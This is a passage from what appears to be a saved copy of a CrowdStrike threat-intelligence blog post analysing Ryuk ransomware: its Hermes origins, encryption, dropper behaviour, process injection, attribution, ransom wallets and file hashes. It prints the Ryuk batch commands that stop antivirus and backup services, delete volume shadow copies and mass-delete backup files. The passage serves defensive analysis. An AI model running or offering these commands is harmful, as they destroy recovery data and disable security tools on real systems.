ransomware appears to have stopped or limited advertising on forums in 2017. Early versions of Hermes were reportedly installed via internet-accessible RDP servers protected by weak credentials. In October 2017, Hermes was deployed as a destructive distraction for a Society for Worldwide Interbank Financial Telecommunication (SWIFT) compromise at the Far Eastern International Bank (FEIB) in Taiwan. Hermes’ role in the SWIFT attack is described in more detail in the Attribution section at the end of this blog. In March 2018, Hermes was observed targeting users in South Korea via the GreenFlash Sundown exploit kit. In mid-August 2018, a modified version of Hermes, dubbed Ryuk, started appearing in a public malware repository. Ryuk was tailored to target enterprise environments and some of the modifications include removing anti-analysis checks. These checks include querying the Process Environment Block (PEB) to see if the field is BeingDebugged, or querying the PEB to see if the field NtGlobalFlag has been set; checking to see if the host is running VirtualBox by calling the instruction CPUID; and ensuring that the host language is not Russian, Ukrainian, or Belarusian. From a process and file perspective, Hermes and Ryuk target files in a similar fashion. The core differences are Ryuk’s logic that handles file access, and the use of a second, embedded public RSA key. The following are characteristics that have not changed: Encrypts files using RSA-2048 and AES-256 Stores keys in the executable using the proprietary Microsoft SIMPLEBLOB format Encrypts mounted devices and remote hosts Uses a file marker of HERMES to mark or check if a file has been encrypted Another notable difference between Hermes and Ryuk is how the encryption keys are created. Hermes starts the encryption initialization by first generating an RSA public and private key pair — referred to as a “victim key.” An AES-256 key is generated and the victim’s RSA private key is encrypted in AES-CBC mode. The attacker-controlled public RSA key is used to encrypt the AES key (previously used to encrypt the victim’s RSA private key). Then, for each file encrypted, an AES key is generated, which is used to encrypt the file. Finally, the AES key for each file is encrypted with the victim’s RSA public key, then stored at the end of the file. Ryuk contains the same logic, but no longer generates the victim-specific RSA key https://www.crowdstrike.com/blog/big-game-hunting-with-ryuk-another-lucrative-targeted-ransomware/ Pagina 6 di 22 What is Ryuk Ransomware? The Complete Breakdown 25/07/24, 11:27 pair. Instead, Ryuk has two public RSA keys embedded in the executable, and what was previously the victim’s RSA private key is encrypted and embedded in the executable. Because Ryuk does not generate a victim-specific RSA key pair, all hosts can be decrypted with the same decryption key. This might appear to be a design flaw but is not, since Ryuk has a unique key for each executable. If a single executable is used for a single victim environment, then there are no repercussions if the private keys are leaked because it will only decrypt the damage from a single Ryuk executable. Thus, it is highly likely that Ryuk pre-generates the RSA key pairs for each victim. This is arguably more secure, since the victim’s system will never have access to the unencrypted RSA key pair parameters without paying the ransom. This approach is similar to INDRIK SPIDER’s BitPaymer ransomware, which generates a victim-specific sample with a hard-coded public key. 4. Ryuk Functionality: A Technical Analysis There are two types of Ryuk binaries: a dropper (which is not commonly observed) and the Ryuk executable payload. Recovery of Ryuk droppers are rare, due to the Ryuk executable payload deleting the dropper when executed. Upon execution, the dropper constructs an installation folder path. The folder path is created by calling GetWindowsDirectoryW and then inserting a null byte at the fourth character of the path. This is used to create a string that contains the drive letter path. If the host operating system is Windows XP or earlier, the string Documents and Settings\Default User\ is appended to the drive letter path. If the host is Windows Vista or newer, the string users\Public\ is appended to the drive letter path. For Windows XP, an example folder path would be C:\Documents and Settings\Default User\, and for Window Vista or higher, the path would be C:\Users\Public. A random executable file name is then constructed. It is created by calling _srand with a seed value returned from calling GetTickCount, then _rand is continuously called until five alphabetic characters are concatenated together. The extension .exe is then appended. The dropper checks whether the host is 32-bit or 64-bit by calling IsWow64Process and writes one of two embedded payload executables corresponding to the host’s architecture. The newly written executable is then run by calling ShellExecuteW. The Ryuk payload executable written by the dropper is the Ryuk component that contains the core logic for encrypting files on the host. Ryuk is under constant development. In recent months, Ryuk binaries have continued to deviate further and further from the original Hermes source code, with the threat actors adding and removing functionality often. In November 2018, Falcon Intelligence identified new functionality added to Ryuk that included an anti-analysis infinite loop, a ping-like request to an IP address once the encryption process was completed, and the addition of an appended file extension for encrypted files. Of these three new features, only the file extension is still present in an executable compiled on Dec. 20, 2018. https://www.crowdstrike.com/blog/big-game-hunting-with-ryuk-another-lucrative-targeted-ransomware/ Pagina 7 di 22 What is Ryuk Ransomware? The Complete Breakdown 25/07/24, 11:27 File Encryption Compared to other families of ransomware, Ryuk has very few safeguards to ensure stability of the host by not encrypting system files. For example, many ransomware families contain extensive lists of file extensions or folder names that should not be encrypted (whitelisted), but Ryuk only whitelists three extensions: It will not encrypt files with the extensions exe, dll, or hrmlog. The last extension appears to be a debug log filename created by the original Hermes developer. It should be noted that absent from this list is sys (system drivers), ocx (OLE control extension) and other executable file types. Encrypting these files could make the host unstable. Early versions of Ryuk included the whitelisting of ini and lnk files, but these have been removed in recent builds. The following folder names are also whitelisted and not encrypted. Chrome Mozilla Recycle.bin Windows Microsoft AhnLab This is only a small subset of folder names that should be whitelisted in order to ensure stability on the host. While doing dynamic analysis, it was not uncommon to observe Ryuk attempting to encrypt files related to the Windows Bootloader (C:\Boot) or other critical files and folders. Due to the absence of proper whitelisting, an infected machine can become unstable over time and unbootable if restarted. As mentioned in the Hermes to Ryuk section, Ryuk uses a combination of symmetric (AES) and asymmetric (RSA) encryption to encrypt files. Without the private key provided by WIZARD SPIDER, the files cannot be decrypted and are unrecoverable. A thread is created for the encryption of each file and each file is encrypted with its own AES key. After the file has been encrypted, a file extension of .RYK is appended to the file. All directories will have a ransom note of (RyukReadMe.txt) written to the directory. Ryuk attempts to encrypt all mounted drives and hosts that have Address Resolution Protocol (ARP) entries (IP addresses) and it enumerates all mounted drives by calling GetLogicalDrives. For each mounted drive, Ryuk calls GetDriveTypeW to determine the drive’s type. If the drive type is not a CD-ROM, files on the drive are encrypted. To retrieve IP addresses that have ARP entries, Ryuk calls GetIpNetTable. It iterates through all entries and then tries to enumerate files and folders on the remote host and encrypt the files. https://www.crowdstrike.com/blog/big-game-hunting-with-ryuk-another-lucrative-targeted-ransomware/ Pagina 8 di 22 What is Ryuk Ransomware? The Complete Breakdown 25/07/24, 11:27 Persistence Current builds of Ryuk no longer contain persistence functionality. Previously, to remain persistent on the host, Ryuk created a registry entry under the Run key using Windows cmd.exe shell. The following command line was used to write to the Registry Run Key name svchos to HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run with the value being the path to the Ryuk executable. Process Injection Ryuk does not encrypt files from within its own process memory space, but injects into a remote process. Before injecting into a remote process, Ryuk attempts to adjust its token privileges to have the SeDebugPrivilege. It takes no action if the adjustment of the token privileges fails. Before injecting into a remote process, Ryuk also calls CreateToolhelp32Snapshot to enumerate all running processes. If a process is found that is not named csrss.exe, explorer.exe, lsaas.exe, or is running under NT AUTHORITY system account, Ryuk will inject itself into this single process. By ensuring that the process is not running under NT AUTHORITY, the developers are assuming the process is not running under another account and therefore can be written to. Ryuk uses a combination of VirtualAlloc, WriteProcessMemory and CreateRemoteThread to inject itself into the remote process. Process/Service Termination and Anti-Recovery Commands Unlike other families of ransomware, Ryuk does not contain process/service termination and anti-recovery functionality embedded in the executable. In the past, Ryuk did contain these capabilities, but they have been removed and are contained within two batch files. The batch file kill.bat contains commands for stopping services, disabling services and killing processes. The processes and services are stopped to ensure no open handles exist for files that will be encrypted. The following figure is a subset of each command. net stop avpsus /y net stop McAfeeDLPAgentService /y net stop mfewc /y net stop BMR Boot Service /y net stop NetBackup BMR MTFTP Service /y … sc config SQLTELEMETRY start= disabled sc config SQLTELEMETRY$ECWDB2 start= disabled sc config SQLWriter start= disabled https://www.crowdstrike.com/blog/big-game-hunting-with-ryuk-another-lucrative-targeted-ransomware/ Pagina 9 di 22 What is Ryuk Ransomware? The Complete Breakdown 25/07/24, 11:27 sc config SstpSvc start= disabled … taskkill /IM mspub.exe /F taskkill /IM mydesktopqos.exe /F taskkill /IM mydesktopservice.exe /F Figure 1. Process/Services Termination kill.bat Commands CrowdStrike has observed another batch file, named windows.bat, which makes file recovery more difficult on the victim’s machine. It should be noted that file names can be arbitrarily changed by the threat actors. The contents of the batch file are shown below in Figure 2. vssadmin Delete Shadows /all /quiet vssadmin resize shadowstorage /for=c: /on=c: /maxsize=401MB vssadmin resize shadowstorage /for=c: /on=c: /maxsize=unbounded vssadmin resize shadowstorage /for=d: /on=d: /maxsize=401MB vssadmin resize shadowstorage /for=d: /on=d: /maxsize=unbounded vssadmin resize shadowstorage /for=e: /on=e: /maxsize=401MB vssadmin resize shadowstorage /for=e: /on=e: /maxsize=unbounded vssadmin resize shadowstorage /for=f: /on=f: /maxsize=401MB vssadmin resize shadowstorage /for=f: /on=f: /maxsize=unbounded vssadmin resize shadowstorage /for=g: /on=g: /maxsize=401MB vssadmin resize shadowstorage /for=g: /on=g: /maxsize=unbounded vssadmin resize shadowstorage /for=h: /on=h: /maxsize=401MB vssadmin resize shadowstorage /for=h: /on=h: /maxsize=unbounded vssadmin Delete Shadows /all /quiet del /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.* c:\backup*.* c:\*.set c:\*.win c:\*.dsk del /s /f /q d:\*.VHD d:\*.bac d:\*.bak d:\*.wbcat d:\*.bkf d:\Backup*.* d:\backup*.* d:\*.set d:\*.win d:\*.dsk del /s /f /q e:\*.VHD e:\*.bac e:\*.bak e:\*.wbcat e:\*.bkf e:\Backup*.* e:\backup*.* e:\*.set e:\*.win e:\*.dsk del /s /f /q f:\*.VHD f:\*.bac f:\*.bak f:\*.wbcat f:\*.bkf f:\Backup*.* f:\backup*.* f:\*.set f:\*.win f:\*.dsk del /s /f /q g:\*.VHD g:\*.bac g:\*.bak g:\*.wbcat g:\*.bkf g:\Backup*.* g:\backup*.* g:\*.set g:\*.win g:\*.dsk del /s /f /q h:\*.VHD h:\*.bac h:\*.bak h:\*.wbcat h:\*.bkf h:\Backup*.* h:\backup*.* h:\*.set h:\*.win h:\*.dsk del %0 Figure 2. Anti-Recovery window.bat Commands These anti-forensic recovery commands are quite interesting and appear to make use of an undocumented feature of the vssadmin resize command. While the first command in Figure 2 above, vssadmin Delete Shadows /all /quiet, is https://www.crowdstrike.com/blog/big-game-hunting-with-ryuk-another-lucrative-targeted-ransomware/ Pagina 10 di 22 What is Ryuk Ransomware? The Complete Breakdown 25/07/24, 11:27 commonly used by ransomware, the command option vssadmin resize shadowstorage is rarely used. In situations where shadow copies were not created by vssadmin, but by third-party applications (such as backup software), vssadmin can display an error and not delete the backups. One such error states: “Snapshots were found, but they were outside of your allowed context. Try removing them with the backup application which created them.” The vssadmin resize shadowstorage command is a “hack” that relies on vssadmin to delete storage when the shadow copies are resized. It forces the shadow copies to be deleted regardless of their context. The command works by resizing the default shadow volume size from 10 percent to 401 MB (the minimum size is 300 MB). Then the shadow storage is set to unbounded, which allows it to use all available disk space. The shadow copies are then deleted by calling the command vssadmin Delete Shadows /all /quiet a second time. The final set of commands deletes files based on their extension or folder locations. The command arguments are for del delete files in all sub-directories (/s) in quiet mode (/q) without asking the user for confirmation and to force (/f) the deletion of a file. The file extensions are for Virtual Hard Disk (.VHD), Avantrix Backup Plus files (.bac), backup copy (.bak), Windows Backup Catalog File (.wbcat), Windows Backup Utility File (.bfk), setting files (.set), Windows Backup File (.win), Disk Images (.dsk) and all folders that start with Backup. Note that since the del command does not securely delete a file (i.e., overwrite a file before deletion), some level of file recovery may be possible using forensic tools. The last command of del %0 deletes the executing .bat file. The anti-recovery commands used by Ryuk are more extensive than most ransomware families. These commands have not been observed being used by other ransomware families yet. This indicates that the threat actors have a thorough understanding of enterprise backup software. 5. Attribution North Korea Open-source reporting has claimed that the Hermes ransomware was developed by the North Korean group STARDUST CHOLLIMA (activities of which have been public reported as part of the “Lazarus Group”), because Hermes was executed on a host (cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0) during the SWIFT compromise of FEIB in October 2017. Table 1 contains samples that are possibly attributed to the compromise. The two executables related to Hermes are bitsran.exe and RSW7B37.tmp. https://www.crowdstrike.com/blog/big-game-hunting-with-ryuk-another-lucrative-targeted-ransomware/ Pagina 11 di 22 Compile What is Ryuk Ransomware? The Complete Breakdown Name Functionality Compiler Version msmpeng.exe TwoPence implant splwow32.exe TwoPence implant FileTokenBroker.dll Loader bitsran.exe Dropper/spreader Time Mon Feb 20 11:09:30 2017 Visual C++ 10.0 2010 SP1 (build 40219) & Visual C++ 9.0 2008 SP1 (build 30729) Mon Feb 20 11:09:30 2017 Visual C++ 10.0 2010 SP1 (build 40219) & Visual C++ 9.0 2008 SP1 (build 30729) Thu Jan 05 01:11:33 2017 Visual C++ 10.0 2010 SP1 (build 40219) & Visual C++ 9.0 2008 SP1 (build 30729) Sun Oct 1 09:37:31 2017 Visual C++ 10.0 2010 SP1 (build 40219) & Visual C++ 9.0 2008 SP1 (build 30729) 25/07/24, 11:27 Linker Version Visual C++ 10.0 2010 SP1 (build 40219) Visual C++ 10.0 2010 SP1 (build 40219) Visual C++ 10.0 2010 SP1 (build 40219) Visual C++ 10.0 2010 (build 30319) RSW7B37.tmp Hermes ransomware Sun Oct 1 05:34:07 2017 Visual C++ 9.0 2008 SP1 (build 30729) Unknown Table 1. File Information for Binaries Used in the FEIB SWIFT Compromise The first executable, bitsran.exe, is a dropper, and RSW7B37.tmp is the Hermes ransomware executable. The dropper’s goal is to propagate the Hermes executable within a network by creating scheduled tasks over SMB sessions using hard-coded credentials. The Hermes executable then encrypts files on the host. It is interesting to note that the compiler and linker for Hermes is different from the other executables. All of the executables except for Hermes were compiled with Visual https://www.crowdstrike.com/blog/big-game-hunting-with-ryuk-another-lucrative-targeted-ransomware/ Pagina 12 di 22 What is Ryuk Ransomware? The Complete Breakdown 25/07/24, 11:27 Studio 10, with a linker of Visual Studio 10. Hermes, in contrast, was compiled with Visual Studio 9, with an unknown linker. If the time stamps are correct, the two executables (bitsran.exe and RSW7B37.tmp) were compiled within four hours and three minutes of each other. Due to the short time frame of Hermes being bundled within an executable that was hard-coded with credentials of the FEIB network, Falcon Intelligence assesses that STARDUST CHOLLIMA likely had access to the Hermes source code, or a third party compiled and built a new version for them. Unlike other variants of Hermes, RSW7B37.tmp does not append the exported and encrypted AES key to the end of the file. Figure 5 is a file encrypted by Hermes with the exported AES key appended to the end of the file as a footer. Figure 5. Example Hermes Footer with Encrypted AES Key Figure 6 is the end of a file encrypted by the Hermes variant RSW7B37.tmp used in the SWIFT attack. The footer only contains the marker HERMES but not the exported AES key. Figure 6. Example Hermes Footer in FEIB SWIFT Attack with Encrypted AES Key Missing Without the encrypted AES key appended to the encrypted files, even if the private key used for encryption was recovered, the files could not be decrypted. Therefore, the Hermes executable used in the FEIB SWIFT attack appears never to have been https://www.crowdstrike.com/blog/big-game-hunting-with-ryuk-another-lucrative-targeted-ransomware/ Pagina 13 di 22 What is Ryuk Ransomware? The Complete Breakdown 25/07/24, 11:27 used to ransom the machine, but rather to destroy the victim’s data. Criminal Actors Operating from Russia Falcon Intelligence has medium-high confidence that the WIZARD SPIDER threat actors are operating out of Russia. Hermes was originally advertised on exploit[.]in. This Russian-speaking forum is a well-known marketplace for selling malware and related services to criminal threat actors. If Hermes was indeed related to STARDUST CHOLLIMA, it would imply that nation-state threat actors are selling their services on Russian-speaking forums, which is unlikely. The Russian threat actor attribution theory is also supported by an early advertisement for Hermes, which stated that their “software did not work and will on work on RU, UA, BY” [sic]. This refers to functionality implemented in Hermes to check the host to ensure that it is not running on a Russian, Ukrainian, or Belarusian system. To check the host language, it queries the registry key HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Nls\Language\ and the value InstallLanguage. If the machine has the value 0419 (Russian), 0422 (Ukrainian) or 0423 (Belarusian), it call ExitProcess to stop executing. This functionality is commonly included by malware developers and sellers who are operating in Russia to reduce their risk of attracting local law enforcement’s attention and criminal prosecution. While supporting an incident response investigation involving Ryuk, Falcon Intelligence noticed files related to the investigation being uploaded to a file- scanning website from an IP address in Moscow, Russia. The file in question was a variant of kill.bat that contained commands previously only observed executed by Ryuk calling ShellExecute. The files could have been uploaded by a victim in Russia, but the time frame between the functionality being removed from Ryuk binaries and included in kill.bat was very short. The most likely scenario is that threat actors were testing whether kill.bat would be detected by antivirus engines. Also, during forensic investigation of a network compromised by WIZARD SPIDER, CrowdStrike Services recovered artifacts with filenames in Russian. One file was named !!! files dlya raboty !!!.rar, which translates to “files for work.” Based on these factors, there is considerably more evidence supporting the hypothesis that the WIZARD SPIDER threat actors are Russian speakers and not North Korean. How CrowdStrike Can Prevent Ryuk The Falcon platform has the ability to detect and prevent Ryuk by taking advantage of the behavioral patterns indicated by the ransomware. By turning on suspicious process blocking, Falcon ensures that Ryuk is killed in the very early stages of execution. In addition, CrowdStrike’s machine learning (ML) algorithm provides https://www.crowdstrike.com/blog/big-game-hunting-with-ryuk-another-lucrative-targeted-ransomware/ Pagina 14 di 22 What is Ryuk Ransomware? The Complete Breakdown 25/07/24, 11:27 additional coverage against this malware family, as illustrated below. Appendix Known Ryuk BTC Wallet Addresses and Payments BTC Address Total Received No Received Total Value (USD) 12vsQry1XrPjPCaH8gWzDJeYT7dhTmpcjL 55.00 1Kx9TT76PHwk8sw7Ur6PsMWyEtaogX7wWY 182.99 1FtQnqvjxEK5GJD9PthHM4MtdmkAeTeoRt 48.250 14aJo5L9PTZhv8XX6qRPncbTXecb8Qohqb 25.00 1E4fQqzCvS8wgqy5T7n1DW8JMNMaUbeFAS 0.001 1GXgngwDMSJZ1Vahmf6iexKVePPXsxGS6H 30.00 1Cyh35KqhhDewmXy63yp9ZMqBnAWe4oJRr 0.00 15LsUgfnuGc1PsHJPcfLQJEnHm2FnGAgYC 0.00 1CbP3cgi1Bcjuz6g2Fwvk4tVhqohqAVpDQ 13.00 3 10 4 2 1 3 0 0 2 $221,685.46 $734,601.91 $188,974.93 $113,342.70 $6.47 $132,654.91 $0.00 $0.00 $82,917.49 https://www.crowdstrike.com/blog/big-game-hunting-with-ryuk-another-lucrative-targeted-ransomware/ Pagina 15 di 22 What is Ryuk Ransomware? The Complete Breakdown 1Jq3WwsaPA7LXwRNYsfySsd8aojdmkFnW 35.00 129L4gRSYgVJTRCgbPDtvYPabnk2QnY9sq 0.00 1ET85GTps8eFbgF1MvVhFVZQeNp2a6LeGw 3.325 1FRNVupsCyTjUvF36GxHZrvLaPtY6hgkTm 38.99 1CW4kTqeoedinSmZiPYH7kvn4qP3mDJQVa 24.077 13rTF3AYsf8xEdafUMT5W1E5Ab2aqPhkPi 0.00 17zTcgKhF8XkWvkD4Y1N8634Qw37KwYkZT 0.00 14dpmsn9rmdcS4dKD4GeqY2dYY6pwu4nVV 0.00 17v2cu8RDXhAxufQ1YKiauBq6GGAZzfnFw 0.00 1KUbXkjDZL6HC3Er34HwJiQUAE9H81Wcsr 10.00 12UbZzhJrdDvdyv9NdCox1Zj1FAQ5onwx3 0.00 1NMgARKzfaDExDSEsNijeT3QWbvTF7FXxS 0.00 19AE1YN6Jo8ognKdJQ3xeQQL1mSZyX16op 25.00 1L9fYHJJxeLMD2yyhh1cMFU2EWF5ihgAmJ 40.035 18eu6KrFgzv8yTMVvKJkRM3YBAyHLonk5G 30.00 1 0 1 3 2 0 0 0 0 1 0 0 1 4 1 25/07/24, 11:27 $221,979.83 $0.00 $12,661.74 $246,893.95 $152,727.13 $0.00 $0.00 $0.00 $0.00 $63,358.27 $0.00 $0.00 $164,774.21 $259,478.16 $198,651.35 1C8n86EEttnDjNKM9Tjm7QNVgwGBncQhDs 30.0082 2 $194,113.76 12N7W9ycLhuck9Q2wT8E6BaN6XzZ4DMLau 0.00 162DVnddxsbXeVgdCy66RxEPADPETBGVBR 0.00 1ChnbV4Rt7nsb5acw5YfYyvBFDj1RXcVQu 28.00 1K6MBjz79QqfLBN7XBnwxCJb8DYUmmDWAt 1.7 1EoyVz2tbGXWL1sLZuCnSX72eR7Ju6qohH 0.00 1NQ42zc51stA4WAVkUK8uqFAjo1DbWv4Kz 0.00 15FC73BdkpDMUWmxo7e7gtLRtM8gQgXyb4 0.00 14hVKm7Ft2rxDBFTNkkRC3kGstMGp2A4hk 10.00 1CN2iQbBikFK9jM34Nb3WLx5DCenQLnbXp 15.00 1LKULheYnNtJXgQNWMo24MeLrBBCouECH7 0.00 15RLWdVnY5n1n7mTvU1zjg67wt86dhYqNj 50.41 0 0 2 2 0 0 0 2 1 0 3 $0.00 $0.00 $175,177.98 $12,455.95 $0.00 $0.00 $0.00 $64,990.62 $92,934.80 $0.00 $326,477.83 https://www.crowdstrike.com/blog/big-game-hunting-with-ryuk-another-lucrative-targeted-ransomware/ Pagina 16 di 22 What is Ryuk Ransomware? The Complete Breakdown 25/07/24, 11:27 1KURvApbe1yC7qYxkkkvtdZ7hrNjdp18sQ 0.00 1NuMXQMUxCngJ7MNQ276KdaXQgGjpjFPhK 10 0 1 $0.00 $41,034.54 Indicators The following table contains the hashes of recently compiled Ryuk payloads: SHA256 795db7bdad1befdd3ad942be79715f6b0c5083d859901b81657b590c9628790f 501e925e5de6c824b5eeccb3ccc5111cf6e312258c0877634935df06b9d0f8b9 fe909d18cf0fde089594689f9a69fbc6d57b69291a09f3b9df1e9b1fb724222b Build Time (UTC) 2018- 12-27 01:10:12 2018- 12-21 02:33:34 2018- 12-21 00:15:31 The following table contains hashes of Hermes executables that were previously analyzed: SHA256 ac648d11f695cf98993fa519803fa26cd43ec32a7a8713bfa34eb618659aff77 5e2c9ec5a108af92f177cabe23451d20e592ae54bb84265d1f972fcbd4f6a409 78c6042067216a5d47f4a338dd951848b122bbcbcd3e61290b2f709543448d90 Build Time (UTC) 2018-07- 20 13:35:25 2018-07- 23 03:47:58 2018-07- 1522:37:30 https://www.crowdstrike.com/blog/big-game-hunting-with-ryuk-another-lucrative-targeted-ransomware/ Pagina 17 di 22 What is Ryuk Ransomware? The Complete Breakdown 25/07/24, 11:27 Additional Resources For more information on how to incorporate intelligence on dangerous threat actors into your security strategy, please visit the Falcon Intelligence product page. Read Stories from the front lines of incident response and get insights that can help inform your security strategy for 2019 in the CrowdStrike Services Cyber Intrusion Casebook 2018. Test Falcon Prevent™ next-gen antivirus for yourself with a free 15-day trial today.  Tweet  Share Related Content Still Alive: Updates for Well-Known Latin America eCrime Malware Identified in 2023 CrowdStrike 2024 Global Threat Report: Adversaries Gain Speed and Stealth How Malicious Insiders Use Known Vulnerabilities Against Their Organizations https://www.crowdstrike.com/blog/big-game-hunting-with-ryuk-another-lucrative-targeted-ransomware/ Pagina 18 di 22"